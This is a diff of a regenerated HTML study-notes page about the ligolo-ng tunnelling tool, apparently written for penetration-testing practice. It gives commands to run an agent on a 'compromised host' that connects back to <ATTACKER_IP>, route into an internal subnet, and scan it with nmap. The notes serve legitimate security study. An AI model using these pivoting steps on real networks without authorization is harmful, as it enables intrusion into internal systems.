@@ -3,11 +3,11 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2026-07-20 Mon 15:57 -->
+<!-- 2026-07-30 Thu 22:16 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>ligolo-ng</title>
-<meta name="author" content="termux" />
+<meta name="author" content="Gregory Hugaerts" />
 <meta name="generator" content="Org Mode" />
 <link rel="stylesheet" href="style.css" type="text/css"/>
 <style type='text/css'>
@@ -860,6 +860,24 @@ pre {
 </head>
 <body>
 <div id="preamble" class="status">
+<div id='generated-header' class='generated'><header>
+ <nav>
+<a class='nav-title'href='/index.html' >
+Gregory Hugaerts
+</a>
+<input id='nav-toggle-top' class='nav-toggle' type='checkbox'>
+<label class='nav-button' for='nav-toggle-top'><span/></label>
+<div class='separator menu-sep'></div>
+<ul class='nav-list'>
+<li class='nav-item'>
+<a class='nav-link' href='/index.html'>
+Knowledge Base</a>
+</li>
+</ul>
+<div class='separator'></div>
+</nav>
+</header>
+</div>
 <div id='view-controls'><div id='toggle-mode' title='Mode'>&#9788;</div><div id='goto-top' title='Top'>&#8963;</div><div id='toggle-toc' title='Contents'>&#9776;</div></div>
 </div>
 <div id="content" class="content">
@@ -868,18 +886,18 @@ pre {
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#org52adb62">Installation</a></li>
-<li><a href="#org4dc6f2c">Core Concepts</a></li>
-<li><a href="#org582ad51">Common Workflows</a>
+<li><a href="#orge0abd48">Installation</a></li>
+<li><a href="#org3adbf2b">Core Concepts</a></li>
+<li><a href="#org2ad05eb">Common Workflows</a>
 <ul>
-<li><a href="#org42bbe07">One-time setup — create the tun interface</a></li>
-<li><a href="#org09a72f0">Start the proxy (attack machine)</a></li>
-<li><a href="#org200dcd0">Deploy and run the agent (target)</a></li>
-<li><a href="#org850722b">Start the tunnel and add the route</a></li>
-<li><a href="#org9ebb88a">Verify connectivity</a></li>
+<li><a href="#org8a7bbad">One-time setup — create the tun interface</a></li>
+<li><a href="#org2e79515">Start the proxy (attack machine)</a></li>
+<li><a href="#org9d255be">Deploy and run the agent (target)</a></li>
+<li><a href="#orga9a7434">Start the tunnel and add the route</a></li>
+<li><a href="#org738657e">Verify connectivity</a></li>
 </ul>
 </li>
-<li><a href="#orgc1370c3">Tips</a></li>
+<li><a href="#org897191a">Tips</a></li>
 </ul>
 </div>
 </div>
@@ -899,20 +917,20 @@ Related: <a href="pentest/20260711T205041--dead-drop__ad_ctf_redo_web.html">Dead
          <a href="20260213T071359--bloodhound__cybersecurity_tool.html">BloodHound</a>
          <a href="20260314T005731--mimikatz__cybersecurity_tool.html">Mimikatz</a>
 </p>
-<div id="outline-container-org52adb62" class="outline-2">
-<h2 id="org52adb62">Installation</h2>
-<div class="outline-text-2" id="text-org52adb62">
+<div id="outline-container-orge0abd48" class="outline-2">
+<h2 id="orge0abd48">Installation</h2>
+<div class="outline-text-2" id="text-orge0abd48">
 <p>
 Not packaged for apt on Parrot/Kali — download the release binary
 directly.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_16453aaa64bc4610b302fbe024e39dad>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_32f52a4cb86b46599970ad15c1b23d93>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_16453aaa64bc4610b302fbe024e39dad=document.querySelector('button[name=btn_16453aaa64bc4610b302fbe024e39dad]');
-copyBtnbtn_16453aaa64bc4610b302fbe024e39dad.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_proxy_<version>_linux_amd64.tar.gz\ntar xzf ligolo-ng_proxy_*.tar.gz\n\nwget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_<version>_linux_amd64.tar.gz\ntar xzf ligolo-ng_agent_*.tar.gz\n`);copyBtnbtn_16453aaa64bc4610b302fbe024e39dad.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_16453aaa64bc4610b302fbe024e39dad.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_32f52a4cb86b46599970ad15c1b23d93=document.querySelector('button[name=btn_32f52a4cb86b46599970ad15c1b23d93]');
+copyBtnbtn_32f52a4cb86b46599970ad15c1b23d93.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_proxy_<version>_linux_amd64.tar.gz\ntar xzf ligolo-ng_proxy_*.tar.gz\n\nwget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_<version>_linux_amd64.tar.gz\ntar xzf ligolo-ng_agent_*.tar.gz\n`);copyBtnbtn_32f52a4cb86b46599970ad15c1b23d93.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_32f52a4cb86b46599970ad15c1b23d93.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -931,9 +949,9 @@ connection issues.
 </p>
 </div>
 </div>
-<div id="outline-container-org4dc6f2c" class="outline-2">
-<h2 id="org4dc6f2c">Core Concepts</h2>
-<div class="outline-text-2" id="text-org4dc6f2c">
+<div id="outline-container-org3adbf2b" class="outline-2">
+<h2 id="org3adbf2b">Core Concepts</h2>
+<div class="outline-text-2" id="text-org3adbf2b">
 <table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">
 
 
@@ -973,19 +991,19 @@ connection issues.
 </table>
 </div>
 </div>
-<div id="outline-container-org582ad51" class="outline-2">
-<h2 id="org582ad51">Common Workflows</h2>
-<div class="outline-text-2" id="text-org582ad51">
+<div id="outline-container-org2ad05eb" class="outline-2">
+<h2 id="org2ad05eb">Common Workflows</h2>
+<div class="outline-text-2" id="text-org2ad05eb">
 </div>
-<div id="outline-container-org42bbe07" class="outline-3">
-<h3 id="org42bbe07">One-time setup — create the tun interface</h3>
-<div class="outline-text-3" id="text-org42bbe07">
+<div id="outline-container-org8a7bbad" class="outline-3">
+<h3 id="org8a7bbad">One-time setup — create the tun interface</h3>
+<div class="outline-text-3" id="text-org8a7bbad">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_8db281f1088c4c278ac7c1ec2a66bb1a>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_9ca501bf52e047debb3c765a8267b4a5>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_8db281f1088c4c278ac7c1ec2a66bb1a=document.querySelector('button[name=btn_8db281f1088c4c278ac7c1ec2a66bb1a]');
-copyBtnbtn_8db281f1088c4c278ac7c1ec2a66bb1a.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`sudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up\n`);copyBtnbtn_8db281f1088c4c278ac7c1ec2a66bb1a.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_8db281f1088c4c278ac7c1ec2a66bb1a.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_9ca501bf52e047debb3c765a8267b4a5=document.querySelector('button[name=btn_9ca501bf52e047debb3c765a8267b4a5]');
+copyBtnbtn_9ca501bf52e047debb3c765a8267b4a5.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`sudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up\n`);copyBtnbtn_9ca501bf52e047debb3c765a8267b4a5.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_9ca501bf52e047debb3c765a8267b4a5.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -995,15 +1013,15 @@ sudo ip link set ligolo up
 </div></div>
 </div>
 </div>
-<div id="outline-container-org09a72f0" class="outline-3">
-<h3 id="org09a72f0">Start the proxy (attack machine)</h3>
-<div class="outline-text-3" id="text-org09a72f0">
+<div id="outline-container-org2e79515" class="outline-3">
+<h3 id="org2e79515">Start the proxy (attack machine)</h3>
+<div class="outline-text-3" id="text-org2e79515">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_31c46ff9db0f46adbe83f2b92d7c7543>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_8fd8dbbfb7e3444ba23936f1ff5a7c23>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_31c46ff9db0f46adbe83f2b92d7c7543=document.querySelector('button[name=btn_31c46ff9db0f46adbe83f2b92d7c7543]');
-copyBtnbtn_31c46ff9db0f46adbe83f2b92d7c7543.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`sudo ./proxy -selfcert\n`);copyBtnbtn_31c46ff9db0f46adbe83f2b92d7c7543.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_31c46ff9db0f46adbe83f2b92d7c7543.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_8fd8dbbfb7e3444ba23936f1ff5a7c23=document.querySelector('button[name=btn_8fd8dbbfb7e3444ba23936f1ff5a7c23]');
+copyBtnbtn_8fd8dbbfb7e3444ba23936f1ff5a7c23.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`sudo ./proxy -selfcert\n`);copyBtnbtn_8fd8dbbfb7e3444ba23936f1ff5a7c23.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_8fd8dbbfb7e3444ba23936f1ff5a7c23.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1018,20 +1036,20 @@ handling.
 </p>
 </div>
 </div>
-<div id="outline-container-org200dcd0" class="outline-3">
-<h3 id="org200dcd0">Deploy and run the agent (target)</h3>
-<div class="outline-text-3" id="text-org200dcd0">
+<div id="outline-container-org9d255be" class="outline-3">
+<h3 id="org9d255be">Deploy and run the agent (target)</h3>
+<div class="outline-text-3" id="text-org9d255be">
 <p>
 Transfer the agent binary to the compromised host (scp, upload
 via webshell, etc.), then run:
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_1e499329bd924d1a9f455edc303a00f0>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_c72f5211e08a493581ab667197d4a307>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_1e499329bd924d1a9f455edc303a00f0=document.querySelector('button[name=btn_1e499329bd924d1a9f455edc303a00f0]');
-copyBtnbtn_1e499329bd924d1a9f455edc303a00f0.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`./agent -connect <ATTACKER_IP>:11601 -ignore-cert\n`);copyBtnbtn_1e499329bd924d1a9f455edc303a00f0.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_1e499329bd924d1a9f455edc303a00f0.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_c72f5211e08a493581ab667197d4a307=document.querySelector('button[name=btn_c72f5211e08a493581ab667197d4a307]');
+copyBtnbtn_c72f5211e08a493581ab667197d4a307.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`./agent -connect <ATTACKER_IP>:11601 -ignore-cert\n`);copyBtnbtn_c72f5211e08a493581ab667197d4a307.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_c72f5211e08a493581ab667197d4a307.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1044,19 +1062,19 @@ Default listener port on the proxy side is 11601.
 </p>
 </div>
 </div>
-<div id="outline-container-org850722b" class="outline-3">
-<h3 id="org850722b">Start the tunnel and add the route</h3>
-<div class="outline-text-3" id="text-org850722b">
+<div id="outline-container-orga9a7434" class="outline-3">
+<h3 id="orga9a7434">Start the tunnel and add the route</h3>
+<div class="outline-text-3" id="text-orga9a7434">
 <p>
 In the ligolo proxy interface, once the agent has connected:
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_61cab7c39c614b9aa31c7cc46e899e89>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_2a76184afcfa41f1906fe953da95aef4>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_61cab7c39c614b9aa31c7cc46e899e89=document.querySelector('button[name=btn_61cab7c39c614b9aa31c7cc46e899e89]');
-copyBtnbtn_61cab7c39c614b9aa31c7cc46e899e89.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`session\nifconfig\nstart\n`);copyBtnbtn_61cab7c39c614b9aa31c7cc46e899e89.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_61cab7c39c614b9aa31c7cc46e899e89.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_2a76184afcfa41f1906fe953da95aef4=document.querySelector('button[name=btn_2a76184afcfa41f1906fe953da95aef4]');
+copyBtnbtn_2a76184afcfa41f1906fe953da95aef4.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`session\nifconfig\nstart\n`);copyBtnbtn_2a76184afcfa41f1906fe953da95aef4.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_2a76184afcfa41f1906fe953da95aef4.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1077,11 +1095,11 @@ the internal subnet via the <code>ligolo</code> interface:
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_575aca0debd247eaaefd94ce1c7a48a1>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_6cf8dcb568ef444d9861120f604c084c>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_575aca0debd247eaaefd94ce1c7a48a1=document.querySelector('button[name=btn_575aca0debd247eaaefd94ce1c7a48a1]');
-copyBtnbtn_575aca0debd247eaaefd94ce1c7a48a1.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`sudo ip route add 192.168.11.0/24 dev ligolo\n`);copyBtnbtn_575aca0debd247eaaefd94ce1c7a48a1.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_575aca0debd247eaaefd94ce1c7a48a1.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_6cf8dcb568ef444d9861120f604c084c=document.querySelector('button[name=btn_6cf8dcb568ef444d9861120f604c084c]');
+copyBtnbtn_6cf8dcb568ef444d9861120f604c084c.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`sudo ip route add 192.168.11.0/24 dev ligolo\n`);copyBtnbtn_6cf8dcb568ef444d9861120f604c084c.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_6cf8dcb568ef444d9861120f604c084c.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1090,15 +1108,15 @@ let res = copyTextToClipboard(`sudo ip route add 192.168.11.0/24 dev ligolo\n`);
 </div></div>
 </div>
 </div>
-<div id="outline-container-org9ebb88a" class="outline-3">
-<h3 id="org9ebb88a">Verify connectivity</h3>
-<div class="outline-text-3" id="text-org9ebb88a">
+<div id="outline-container-org738657e" class="outline-3">
+<h3 id="org738657e">Verify connectivity</h3>
+<div class="outline-text-3" id="text-org738657e">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_1592109089c74262b837c13bc03cf165>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_fc2678b8514e496cbf3d6a1123aaba37>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_1592109089c74262b837c13bc03cf165=document.querySelector('button[name=btn_1592109089c74262b837c13bc03cf165]');
-copyBtnbtn_1592109089c74262b837c13bc03cf165.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`ip route | grep ligolo\nnmap -sT -Pn -p 445,3389,88 192.168.11.0/24\n`);copyBtnbtn_1592109089c74262b837c13bc03cf165.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_1592109089c74262b837c13bc03cf165.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_fc2678b8514e496cbf3d6a1123aaba37=document.querySelector('button[name=btn_fc2678b8514e496cbf3d6a1123aaba37]');
+copyBtnbtn_fc2678b8514e496cbf3d6a1123aaba37.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`ip route | grep ligolo\nnmap -sT -Pn -p 445,3389,88 192.168.11.0/24\n`);copyBtnbtn_fc2678b8514e496cbf3d6a1123aaba37.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_fc2678b8514e496cbf3d6a1123aaba37.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1115,9 +1133,9 @@ mean the route is broken. Confirm with a TCP-based check instead
 </div>
 </div>
 </div>
-<div id="outline-container-orgc1370c3" class="outline-2">
-<h2 id="orgc1370c3">Tips</h2>
-<div class="outline-text-2" id="text-orgc1370c3">
+<div id="outline-container-org897191a" class="outline-2">
+<h2 id="org897191a">Tips</h2>
+<div class="outline-text-2" id="text-org897191a">
 <ul class="org-ul">
 <li>Create the <code>tun</code> interface once per attack-machine boot, before
 starting the proxy — <code>start</code> inside the session will fail if the
@@ -1136,6 +1154,20 @@ the agent — a typo'd /24 here is an easy, silent failure mode.</li>
 </div>
 </div>
 <div id="postamble" class="status">
+<div id='generated-footer' class='generated'><footer>
+ <nav>
+<div class='separator'></div>
+<a class='nav-author'href='https://gregoryhugaerts.github.io' >
+gregoryhugaerts.github.io
+</a>
+<input id='nav-toggle-bot' class='nav-toggle' type='checkbox'>
+<label class='nav-button' for='nav-toggle-bot'><span/></label>
+<div class='separator menu-sep'></div>
+<ul class='nav-list'>
+</ul>
+</nav>
+</footer>
+</div>
 <script type="text/javascript">
 <!--/*--><![CDATA[/*><!--*/
 if (!document.cookie.split('; ').find(r => r.startsWith('mode'))) {
@@ -1143,6 +1175,7 @@ document.cookie = 'mode=dark'
 }
 document.cookie = 'light=modus-operandi-tinted'
 document.cookie = 'dark=modus-vivendi-tinted'
+document.cookie = 'options=collapsing:t__src-lang:t';
 /*
 ;; nice-org-html.js
 ;;==============================================================================
